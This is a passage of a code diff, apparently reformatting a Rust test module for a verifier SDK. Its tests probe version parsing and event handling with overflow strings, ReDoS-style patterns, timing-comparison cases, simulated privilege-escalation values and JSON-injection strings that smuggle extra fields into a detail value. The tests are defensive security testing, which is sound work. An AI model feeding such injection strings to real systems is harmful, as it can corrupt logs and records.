         let bucket_count = hash_collision_tracker.len();
-        assert!(bucket_count > 500, "Hash distribution should be reasonably spread: {} buckets", bucket_count);
+        assert!(
+            bucket_count > 500,
+            "Hash distribution should be reasonably spread: {} buckets",
+            bucket_count
+        );
 
         // Verify that high-collision buckets don't break the system
         let max_collisions = hash_collision_tracker.values().max().copied().unwrap_or(0);
-        assert!(max_collisions < collision_candidates / 10,
-               "Maximum collision count should be reasonable: {}", max_collisions);
+        assert!(
+            max_collisions < collision_candidates / 10,
+            "Maximum collision count should be reasonable: {}",
+            max_collisions
+        );
     }
 
     #[test]
@@ -890,20 +1325,16 @@ mod tests {
             format!("vsdk-v0.{}", u64::MAX),
             format!("vsdk-v{}.{}", u32::MAX, u32::MAX),
             format!("vsdk-v{}.{}", i64::MAX, i64::MAX),
-
             // Multiple overflow components
             format!("vsdk-v{}.{}.{}", u64::MAX, u64::MAX, u64::MAX),
             format!("vsdk-v{}.{}.{}.{}", u32::MAX, u32::MAX, u32::MAX, u32::MAX),
-
             // Potential wraparound values
             format!("vsdk-v{}.0", u32::MAX as u64 + 1),
             format!("vsdk-v0.{}", u32::MAX as u64 + 1),
-
             // Scientific notation overflow attempts
             "vsdk-v1e308.0".to_string(),
             "vsdk-v1.1e308".to_string(),
             "vsdk-v999999999999999999999999.0".to_string(),
-
             // Leading zeros that could cause octal interpretation
             format!("vsdk-v{:020}.0", 1), // Leading zeros
             format!("vsdk-v0.{:020}", 1),
@@ -915,15 +1346,25 @@ mod tests {
             let duration = start_time.elapsed();
 
             // Should reject overflow versions quickly without arithmetic errors
-            assert!(result.is_err(), "Overflow version should be rejected: {}", overflow_version);
-            assert!(duration < std::time::Duration::from_millis(10),
-                   "Version check should complete quickly despite overflow: {:?}", duration);
+            assert!(
+                result.is_err(),
+                "Overflow version should be rejected: {}",
+                overflow_version
+            );
+            assert!(
+                duration < std::time::Duration::from_millis(10),
+                "Version check should complete quickly despite overflow: {:?}",
+                duration
+            );
 
             let err = result.unwrap_err();
             assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
 
             // Error message should be safely bounded despite large numbers
-            assert!(err.len() < 500, "Error message should not be excessively long");
+            assert!(
+                err.len() < 500,
+                "Error message should not be excessively long"
+            );
             assert!(err.contains("requested="));
             assert!(err.contains("supported=vsdk-v1.0"));
 
@@ -933,9 +1374,11 @@ mod tests {
         }
 
         // Test edge case: version that could cause saturation
-        let saturation_version = format!("vsdk-v{}.{}",
-                                        std::u64::MAX.saturating_sub(1),
-                                        std::u64::MAX.saturating_sub(1));
+        let saturation_version = format!(
+            "vsdk-v{}.{}",
+            std::u64::MAX.saturating_sub(1),
+            std::u64::MAX.saturating_sub(1)
+        );
         let result = check_sdk_version(&saturation_version);
         assert!(result.is_err());
     }
@@ -957,8 +1400,12 @@ mod tests {
 
             // Memory usage should remain bounded
             let memory_estimate = nested_detail.len() * std::mem::size_of::<char>();
-            assert!(memory_estimate < 10_000_000, // 10MB limit
-                   "Memory usage should be bounded at depth {}: {} bytes", depth, memory_estimate);
+            assert!(
+                memory_estimate < 10_000_000, // 10MB limit
+                "Memory usage should be bounded at depth {}: {} bytes",
+                depth,
+                memory_estimate
+            );
 
             // Test cloning at each depth level
             let cloned = current_event.clone();
@@ -992,24 +1439,20 @@ mod tests {
         let complexity_test_cases = vec![
             // Simple baseline
             ("vsdk-v1.0".to_string(), "baseline"),
-
             // Repeated patterns that might stress string comparison
             ("vsdk-v1.0".to_owned() + &"x".repeat(1000), "long_suffix"),
             ("v".repeat(1000) + "sdk-v1.0", "long_prefix"),
             ("vs".repeat(500) + "dk-v1.0", "repeated_prefix"),
-
             // Patterns that might stress specific algorithms
             ("vsdk-".to_string() + &"a".repeat(1000), "no_version"),
             ("vsdk-v".to_string() + &"1".repeat(500), "repeated_digits"),
             ("vsdk-v1.".to_string() + &"0".repeat(500), "repeated_zeros"),
-
             // Unicode complexity
             ("vsdk-v1🚀.0🔥".to_string(), "unicode_emoji"),
             (
                 "vsdk-v1".to_string() + &"\u{0300}".repeat(100) + ".0",
                 "combining_chars",
             ),
-
             // Nested structure patterns
             ("vsdk-v".to_string() + &"(())".repeat(250), "nested_parens"),
             (
@@ -1031,14 +1474,17 @@ mod tests {
                 times.push(duration);
 
                 // Each call should complete quickly regardless of complexity
-                assert!(duration < std::time::Duration::from_millis(10),
-                       "Version check too slow for {}: {:?}", test_name, duration);
+                assert!(
+                    duration < std::time::Duration::from_millis(10),
+                    "Version check too slow for {}: {:?}",
+                    test_name,
+                    duration
+                );
             }
 
             // Calculate statistics
-            let avg_nanos: f64 = times.iter()
-                .map(|d| d.as_nanos() as f64)
-                .sum::<f64>() / sample_count as f64;
+            let avg_nanos: f64 =
+                times.iter().map(|d| d.as_nanos() as f64).sum::<f64>() / sample_count as f64;
 
             let max_nanos = times.iter().map(|d| d.as_nanos()).max().unwrap() as f64;
             let min_nanos = times.iter().map(|d| d.as_nanos()).min().unwrap() as f64;
@@ -1050,20 +1496,33 @@ mod tests {
         let baseline_avg = timing_samples.get(&"baseline").unwrap().0;
 
         for (test_name, (avg, max, min)) in &timing_samples {
-            if **test_name == "baseline" { continue; }
+            if **test_name == "baseline" {
+                continue;
+            }
 
             let timing_ratio = avg / baseline_avg;
 
             // Complex inputs should not cause dramatically longer processing times
-            assert!(timing_ratio < 5.0,
-                   "Suspicious timing difference for {}: baseline={:.0}ns, test={:.0}ns, ratio={:.2}",
-                   test_name, baseline_avg, avg, timing_ratio);
+            assert!(
+                timing_ratio < 5.0,
+                "Suspicious timing difference for {}: baseline={:.0}ns, test={:.0}ns, ratio={:.2}",
+                test_name,
+                baseline_avg,
+                avg,
+                timing_ratio
+            );
 
             // Variance within each test should be reasonable
             let variance_ratio = (max - min) / avg;
-            assert!(variance_ratio < 3.0,
-                   "High timing variance for {}: avg={:.0}ns, max={:.0}ns, min={:.0}ns, variance_ratio={:.2}",
-                   test_name, avg, max, min, variance_ratio);
+            assert!(
+                variance_ratio < 3.0,
+                "High timing variance for {}: avg={:.0}ns, max={:.0}ns, min={:.0}ns, variance_ratio={:.2}",
+                test_name,
+                avg,
+                max,
+                min,
+                variance_ratio
+            );
         }
     }
 
@@ -1075,22 +1534,17 @@ mod tests {
             r#"","malicious":"injected"#,
             r#""},"injected_field":"evil"#,
             r#"\":\"injected\",\"evil\":true,\"fake\":\""#,
-
             // Nested JSON injection
             r#"{"nested":{"injection":"attempt"}}"#,
             r#"[{"array":"injection"}]"#,
-
             // JSON with control characters
             "detail\",\"injected\":\"\x00\x01\x02",
             "detail\\\",\\\"injection\\\":true",
-
             // JSON escape sequence attacks
             "\\\"},{\\\"injected\\\":true,\\\"x\\\":\\\"",
             "\\\\\",\\\"injection\\\":1337,\\\"",
-
             // Unicode escape injection
             "\\u0022,\\u0022injected\\u0022:\\u0022evil\\u0022",
-
             // JSON payload with special characters
             "detail\"},\"injection\":true,\"comment\":\"//",
             "detail\"}/*injection*/,\"evil\":true",
@@ -1149,17 +1603,15 @@ mod tests {
         let comparison_test_cases = vec![
             // Differ at different positions
             (baseline_version, "baseline"),
-            ("xsdk-v1.0", "first_char_diff"),      // Differs at position 0
-            ("vsdk-v2.0", "version_diff"),         // Differs at position 7
-            ("vsdk-v1.1", "minor_diff"),           // Differs at position 9
-            ("vsdk-v1.0x", "extra_char"),          // Extra character at end
-
+            ("xsdk-v1.0", "first_char_diff"), // Differs at position 0
+            ("vsdk-v2.0", "version_diff"),    // Differs at position 7
+            ("vsdk-v1.1", "minor_diff"),      // Differs at position 9
+            ("vsdk-v1.0x", "extra_char"),     // Extra character at end
             // Different lengths but similar prefixes
             ("v", "very_short"),
             ("vsdk", "partial_match"),
             ("vsdk-v1", "almost_complete"),
             ("vsdk-v1.0.extra", "extra_long"),
-
             // Wrong versions with same length
             ("asdk-v1.0", "same_length_a"),
             ("bsdk-v1.0", "same_length_b"),
@@ -1188,7 +1640,10 @@ mod tests {
         }
 
         // Analyze for timing attack vulnerabilities
-        let times: Vec<f64> = timing_results.values().map(|(median, _, _)| *median).collect();
+        let times: Vec<f64> = timing_results
+            .values()
+            .map(|(median, _, _)| *median)
+            .collect();
         let avg_time = times.iter().sum::<f64>() / times.len() as f64;
         let max_time = times.iter().fold(0.0_f64, |acc, &x| acc.max(x));
         let min_time = times.iter().fold(f64::INFINITY, |acc, &x| acc.min(x));
@@ -1196,16 +1651,26 @@ mod tests {
         // All comparisons should take similar time (constant-time comparison)
         let timing_variance_ratio = (max_time - min_time) / avg_time;
 
-        assert!(timing_variance_ratio < 2.0,
-               "Excessive timing variance suggests non-constant-time comparison: avg={:.0}ns, max={:.0}ns, min={:.0}ns, ratio={:.2}",
-               avg_time, max_time, min_time, timing_variance_ratio);
+        assert!(
+            timing_variance_ratio < 2.0,
+            "Excessive timing variance suggests non-constant-time comparison: avg={:.0}ns, max={:.0}ns, min={:.0}ns, ratio={:.2}",
+            avg_time,
+            max_time,
+            min_time,
+            timing_variance_ratio
+        );
 
         // No individual test case should be dramatically different
         for (test_name, (median, _min, _max)) in &timing_results {
             let individual_ratio = median / avg_time;
-            assert!(individual_ratio < 3.0 && individual_ratio > 0.3,
-                   "Test case {} has suspicious timing: median={:.0}ns, avg={:.0}ns, ratio={:.2}",
-                   test_name, median, avg_time, individual_ratio);
+            assert!(
+                individual_ratio < 3.0 && individual_ratio > 0.3,
+                "Test case {} has suspicious timing: median={:.0}ns, avg={:.0}ns, ratio={:.2}",
+                test_name,
+                median,
+                avg_time,
+                individual_ratio
+            );
         }
     }
 
@@ -1214,22 +1679,39 @@ mod tests {
         // Extreme: Test privilege escalation attempts through SDK boundary manipulation
 
         // Simulate attempts to bypass structural-only security posture
-        let privilege_escalation_attempts = vec!(
+        let privilege_escalation_attempts = vec![
             // Direct security posture bypass attempts
-            ("bypass_posture", STRUCTURAL_ONLY_SECURITY_POSTURE, "replacement_critical"),
-            ("modify_rule", STRUCTURAL_ONLY_RULE_ID, "PRIVILEGED_VERIFIER_ACCESS"),
-
+            (
+                "bypass_posture",
+                STRUCTURAL_ONLY_SECURITY_POSTURE,
+                "replacement_critical",
+            ),
+            (
+                "modify_rule",
+                STRUCTURAL_ONLY_RULE_ID,
+                "PRIVILEGED_VERIFIER_ACCESS",
+            ),
             // Version manipulation for privilege escalation
             ("version_escalate", SDK_VERSION, "vsdk-v2.0-privileged"),
             ("min_version_bypass", SDK_VERSION_MIN, "vsdk-v0.0-admin"),
-
             // Event code manipulation
-            ("event_escalate", CAPSULE_CREATED, "PRIVILEGED_CAPSULE_CREATED"),
-            ("error_manipulate", ERR_CAPSULE_ACCESS_DENIED, "CAPSULE_ACCESS_GRANTED"),
-
+            (
+                "event_escalate",
+                CAPSULE_CREATED,
+                "PRIVILEGED_CAPSULE_CREATED",
+            ),
+            (
+                "error_manipulate",
+                ERR_CAPSULE_ACCESS_DENIED,
+                "CAPSULE_ACCESS_GRANTED",
+            ),
             // Invariant violation attempts
-            ("invariant_bypass", INV_CAPSULE_NO_PRIVILEGED_ACCESS, "INV-CAPSULE-PRIVILEGED-ACCESS-ALLOWED"),
-        );
+            (
+                "invariant_bypass",
+                INV_CAPSULE_NO_PRIVILEGED_ACCESS,
+                "INV-CAPSULE-PRIVILEGED-ACCESS-ALLOWED",
+            ),
+        ];
 
         for (test_name, original_constant, malicious_value) in privilege_escalation_attempts {
             assert_ne!(original_constant, malicious_value);
@@ -1237,33 +1719,42 @@ mod tests {
             // Verify constants remain immutable and correct
             match test_name {
                 "bypass_posture" => {
-                    assert_eq!(STRUCTURAL_ONLY_SECURITY_POSTURE, "structural_only_not_replacement_critical");
+                    assert_eq!(
+                        STRUCTURAL_ONLY_SECURITY_POSTURE,
+                        "structural_only_not_replacement_critical"
+                    );
                     assert_ne!(STRUCTURAL_ONLY_SECURITY_POSTURE, malicious_value);
-                },
+                }
                 "modify_rule" => {
-                    assert_eq!(STRUCTURAL_ONLY_RULE_ID, "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK");
+                    assert_eq!(
+                        STRUCTURAL_ONLY_RULE_ID,
+                        "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK"
+                    );
                     assert_ne!(STRUCTURAL_ONLY_RULE_ID, malicious_value);
-                },
+                }
                 "version_escalate" => {
                     assert_eq!(SDK_VERSION, "vsdk-v1.0");
                     assert_ne!(SDK_VERSION, malicious_value);
-                },
+                }
                 "min_version_bypass" => {
                     assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
                     assert_ne!(SDK_VERSION_MIN, malicious_value);
-                },
+                }
                 "event_escalate" => {
                     assert_eq!(CAPSULE_CREATED, "CAPSULE_CREATED");
                     assert_ne!(CAPSULE_CREATED, malicious_value);
-                },
+                }
                 "error_manipulate" => {
                     assert_eq!(ERR_CAPSULE_ACCESS_DENIED, "ERR_CAPSULE_ACCESS_DENIED");
                     assert_ne!(ERR_CAPSULE_ACCESS_DENIED, malicious_value);
-                },
+                }
                 "invariant_bypass" => {
-                    assert_eq!(INV_CAPSULE_NO_PRIVILEGED_ACCESS, "INV-CAPSULE-NO-PRIVILEGED-ACCESS");
+                    assert_eq!(
+                        INV_CAPSULE_NO_PRIVILEGED_ACCESS,
+                        "INV-CAPSULE-NO-PRIVILEGED-ACCESS"
+                    );
                     assert_ne!(INV_CAPSULE_NO_PRIVILEGED_ACCESS, malicious_value);
-                },
+                }
                 _ => {}
             }
 
@@ -1275,8 +1766,11 @@ mod tests {
             // Verify version checking rejects privilege escalation versions
             if malicious_value.starts_with("vsdk-v") {
                 let version_result = check_sdk_version(malicious_value);
-                assert!(version_result.is_err(),
-                       "Privileged version should be rejected: {}", malicious_value);
+                assert!(
+                    version_result.is_err(),
+                    "Privileged version should be rejected: {}",
+                    malicious_value
+                );
 
                 let err = version_result.unwrap_err();
                 assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
@@ -1291,10 +1785,14 @@ mod tests {
         assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));
 
         // Test that SDK maintains proper security boundaries
-        let privileged_event = SdkEvent::new(ERR_CAPSULE_ACCESS_DENIED,
-                                           "attempted_privilege_escalation");
+        let privileged_event =
+            SdkEvent::new(ERR_CAPSULE_ACCESS_DENIED, "attempted_privilege_escalation");
         assert_eq!(privileged_event.event_code, ERR_CAPSULE_ACCESS_DENIED);
-        assert!(privileged_event.detail.contains("attempted_privilege_escalation"));
+        assert!(
+            privileged_event
+                .detail
+                .contains("attempted_privilege_escalation")
+        );
 
         // Verify invariants remain true
         assert!(INV_CAPSULE_NO_PRIVILEGED_ACCESS.contains("NO-PRIVILEGED-ACCESS"));
@@ -1310,26 +1808,30 @@ mod tests {
         let complexity_bomb_patterns = vec![
             // Exponential pattern matching worst cases
             ("a".repeat(1000) + "b", "linear_with_mismatch"),
-
             // Nested parentheses (potential ReDoS patterns)
             ("(".repeat(500) + &")".repeat(500), "balanced_parens"),
             ("(".repeat(1000), "unbalanced_open"),
             (")".repeat(1000), "unbalanced_close"),
-
             // Alternating patterns that stress string algorithms
             ("ab".repeat(5000), "alternating_short"),
             ("abc".repeat(3333), "alternating_triplet"),
-
             // Unicode normalization complexity bombs
             ("e\u{0301}".repeat(1000), "combining_accents"), // é repeated
-            ("\u{0300}".repeat(2000), "combining_only"),      // Combining chars only
-
+            ("\u{0300}".repeat(2000), "combining_only"),     // Combining chars only
             // Pattern that could trigger quadratic behavior in naive algorithms
-            ("x".repeat(100) + "y" + &"x".repeat(100), "embedded_mismatch"),
-
+            (
+                "x".repeat(100) + "y" + &"x".repeat(100),
+                "embedded_mismatch",
+            ),
             // Deeply nested structure patterns
-            (format!("{}{}{}", "[".repeat(100), "data", "]".repeat(100)), "nested_brackets"),
-            (format!("{}{}{}", "{".repeat(200), "json", "}".repeat(200)), "nested_braces"),
+            (
+                format!("{}{}{}", "[".repeat(100), "data", "]".repeat(100)),
+                "nested_brackets",
+            ),
+            (
+                format!("{}{}{}", "{".repeat(200), "json", "}".repeat(200)),
+                "nested_braces",
+            ),
         ];
 
         for (pathological_detail, test_name) in complexity_bomb_patterns {
@@ -1339,8 +1841,12 @@ mod tests {
             let event = SdkEvent::new(CAPSULE_SIGNED, pathological_detail.clone());
             let creation_time = start_time.elapsed();
 
-            assert!(creation_time < std::time::Duration::from_millis(50),
-                   "Event creation too slow for {}: {:?}", test_name, creation_time);
+            assert!(
+                creation_time < std::time::Duration::from_millis(50),
+                "Event creation too slow for {}: {:?}",
+                test_name,
+                creation_time
+            );
 
             assert_eq!(event.event_code, CAPSULE_SIGNED);
             assert_eq!(event.detail, pathological_detail);
@@ -1351,8 +1857,12 @@ mod tests {
             let cloned = event.clone();
             let clone_time = clone_start.elapsed();
 
-            assert!(clone_time < std::time::Duration::from_millis(20),
-                   "Event cloning too slow for {}: {:?}", test_name, clone_time);
+            assert!(
+                clone_time < std::time::Duration::from_millis(20),
+                "Event cloning too slow for {}: {:?}",
+                test_name,
+                clone_time
+            );
             assert_eq!(cloned.detail, event.detail);
 
             // Debug formatting should be bounded
@@ -1360,14 +1870,22 @@ mod tests {
             let debug_output = format!("{:?}", event);
             let debug_time = debug_start.elapsed();
 
-            assert!(debug_time < std::time::Duration::from_millis(100),
-                   "Debug formatting too slow for {}: {:?}", test_name, debug_time);
+            assert!(
+                debug_time < std::time::Duration::from_millis(100),
+                "Debug formatting too slow for {}: {:?}",
+                test_name,
+                debug_time
+            );
             assert!(debug_output.contains("CAPSULE_SIGNED"));
 
             // Memory usage should be proportional to input size, not exponential
             let estimated_memory = pathological_detail.len() * std::mem::size_of::<char>() * 3; // Some overhead
-            assert!(estimated_memory < 50_000_000, // 50MB limit
-                   "Estimated memory usage too high for {}: {} bytes", test_name, estimated_memory);
+            assert!(
+                estimated_memory < 50_000_000, // 50MB limit
+                "Estimated memory usage too high for {}: {} bytes",
+                test_name,
+                estimated_memory
+            );
         }
 
         // Test batched processing of pathological patterns
@@ -1381,8 +1899,11 @@ mod tests {
         }
 
         let batch_time = batch_start.elapsed();
-        assert!(batch_time < std::time::Duration::from_millis(500),
-               "Batch processing too slow: {:?}", batch_time);
+        assert!(
+            batch_time < std::time::Duration::from_millis(500),
+            "Batch processing too slow: {:?}",
+            batch_time
+        );
 
         // Verify all batch events are correct
         for (i, event) in batch_events.iter().enumerate() {
